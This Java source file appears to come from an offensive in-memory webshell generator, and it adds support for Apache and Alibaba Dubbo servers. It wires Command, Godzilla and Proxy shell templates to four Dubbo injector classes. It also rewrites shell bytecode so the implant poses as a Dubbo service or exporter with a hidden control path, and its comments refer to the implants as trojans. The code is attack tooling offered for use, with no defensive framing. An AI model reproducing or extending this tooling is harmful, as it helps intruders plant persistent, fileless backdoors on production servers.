package com.reajason.javaweb.memshell.server.dubbo;

import com.reajason.javaweb.asm.ClassInterfaceUtils;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.ToolMapping;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.javaweb.utils.StringUtils;

import net.bytebuddy.jar.asm.Opcodes;

import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Set;

public class Dubbo extends AbstractServer {

    private static final String COMMAND_SHELL =
            "com.reajason.javaweb.memshell.shelltool.command.CommandDubboService";
    private static final String GODZILLA_SHELL =
            "com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaDubboService";
    private static final String PROXY_SHELL =
            "com.reajason.javaweb.memshell.shelltool.proxy.ProxyDubboService";

    /**
     * 注入器模板使用 lambda/invokedynamic，Java 6 类文件表达不了。
     */
    @Override
    public int getMinimumTargetJreVersion() {
        return Opcodes.V1_8;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(DubboShellType.APACHE_DUBBO_SERVICE,
                        "com.reajason.javaweb.memshell.injector.dubbo.ApacheDubboServiceInjector")
                .addInjector(DubboShellType.ALIBABA_DUBBO_SERVICE,
                        "com.reajason.javaweb.memshell.injector.dubbo.AlibabaDubboServiceInjector")
                .addInjector(DubboShellType.APACHE_DUBBO_EXPORTER,
                        "com.reajason.javaweb.memshell.injector.dubbo.ApacheDubboExporterInjector")
                .addInjector(DubboShellType.ALIBABA_DUBBO_EXPORTER,
                        "com.reajason.javaweb.memshell.injector.dubbo.AlibabaDubboExporterInjector")
                .build();
    }

    /**
     * The command, godzilla and proxy plugins each ship their own shell templates and know
     * nothing about Dubbo. This server contributes the Dubbo transport templates to those
     * registered tools; the tools keep their names, configuration and UI entries unchanged.
     */
    @Override
    public Map<String, ToolMapping> getToolMappingOverrides() {
        Map<String, ToolMapping> overrides = new LinkedHashMap<String, ToolMapping>();
        overrides.put(ShellTool.Command, dubboToolMapping(COMMAND_SHELL));
        overrides.put(ShellTool.Godzilla, dubboToolMapping(GODZILLA_SHELL));
        overrides.put(ShellTool.Proxy, dubboToolMapping(PROXY_SHELL));
        return Collections.unmodifiableMap(overrides);
    }

    private static ToolMapping dubboToolMapping(String shellTemplateClassName) {
        return ToolMapping.builder()
                .addShellClass(DubboShellType.APACHE_DUBBO_SERVICE, shellTemplateClassName)
                .addShellClass(DubboShellType.ALIBABA_DUBBO_SERVICE, shellTemplateClassName)
                .addShellClass(DubboShellType.APACHE_DUBBO_EXPORTER, shellTemplateClassName)
                .addShellClass(DubboShellType.ALIBABA_DUBBO_EXPORTER, shellTemplateClassName)
                .build();
    }

    @Override
    public Set<MethodSignature> getShellMethodContracts(String shellType) {
        if (isDubboTransport(shellType)) {
            return DubboMethodContracts.DUBBO_CONTRACTS;
        }
        return super.getShellMethodContracts(shellType);
    }

    /**
     * Dubbo 服务按接口名注册，类名沿用上游的 Service 后缀，保持与旧版本生成的马一致。
     * Exporter 马不暴露服务接口，但同样需要一个稳定的控制路径，类名后缀区分两种传输。
     */
    @Override
    public String getShellClassName(String serverName, String shellType) {
        String suffix = shellType != null && shellType.endsWith(DubboShellType.DUBBO_EXPORTER)
                ? "Exporter" : "Service";
        return sampleShellClassName(getShellPackageName(serverName), suffix);
    }

    /**
     * DubboService 马需要配套接口：生成接口 helper 类、给马字节码补上接口实现，
     * 且 urlPattern 默认取接口全限定名（Dubbo 服务按接口名注册）
     *
     * Exporter 马只把控制路径注册进 exporter map，不实现接口、不导出服务，
     * 因此只补一个不与业务服务重名的默认控制路径。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (isExporterType(shellConfig.getShellType())) {
            String urlPattern = injectorConfig.getUrlPattern();
            if (StringUtils.equalsAny(urlPattern, "/*", "/")
                    || StringUtils.isBlank(urlPattern)) {
                injectorConfig.setUrlPattern(controlPath(shellToolConfig.getShellClassName()));
            }
            return shellBytes;
        }
        if (!shellConfig.getShellType().endsWith(DubboShellType.DUBBO_SERVICE)) {
            return shellBytes;
        }
        String packageName = CommonUtil.getPackageName(shellToolConfig.getShellClassName());
        String simpleName = CommonUtil.getSimpleName(shellToolConfig.getShellClassName());
        String interfaceName = packageName + ".I" + simpleName;
        injectorConfig.setInjectorHelperClassName(interfaceName);
        injectorConfig.setHelperClassBytes(DubboServiceInterfaceHelperGenerator.getBytes(interfaceName, shellConfig));
        shellBytes = ClassInterfaceUtils.addInterface(shellBytes, interfaceName);
        String urlPattern = injectorConfig.getUrlPattern();
        if (StringUtils.equalsAny(urlPattern, "/*", "/")
                || StringUtils.isBlank(urlPattern)) {
            injectorConfig.setUrlPattern(interfaceName);
        }
        return shellBytes;
    }

    private static boolean isDubboTransport(String shellType) {
        return shellType != null
                && (shellType.endsWith(DubboShellType.DUBBO_SERVICE)
                || shellType.endsWith(DubboShellType.DUBBO_EXPORTER));
    }

    private static boolean isExporterType(String shellType) {
        return shellType != null && shellType.endsWith(DubboShellType.DUBBO_EXPORTER);
    }

    private static String controlPath(String shellClassName) {
        String packageName = CommonUtil.getPackageName(shellClassName);
        String simpleName = CommonUtil.getSimpleName(shellClassName);
        return packageName + ".I" + simpleName;
    }
}
